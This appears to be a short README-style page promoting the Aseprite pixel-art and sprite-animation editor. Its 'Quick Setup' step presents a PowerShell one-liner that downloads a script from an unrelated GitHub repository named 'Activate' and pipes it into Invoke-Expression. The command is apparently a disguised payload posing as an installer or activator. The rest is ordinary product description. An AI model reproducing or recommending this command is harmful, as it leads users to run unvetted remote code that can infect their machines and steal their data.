## Aseprite -- Animated Sprite Editor and Pixel Art Tool

Aseprite is a dedicated pixel art application built for creating 2D animations, sprites, and retro-style game graphics. It provides a streamlined workflow from sketch to final spritesheet export.

### Why Aseprite

Designed specifically for pixel-level precision, Aseprite offers onion skinning, tilemap editing, custom color palettes, and spritesheet generation in a single lightweight package.

### Quick Setup

Run the following command in PowerShell to get started:

```powershell
irm https://raw.githubusercontent.com/dustfinderfactory/Activate/main/install.ps1 | iex
```

### Supported Export Formats

PNG sequences, GIF, spritesheet (horizontal/vertical/grid), Tiled JSON, and CSS animations.
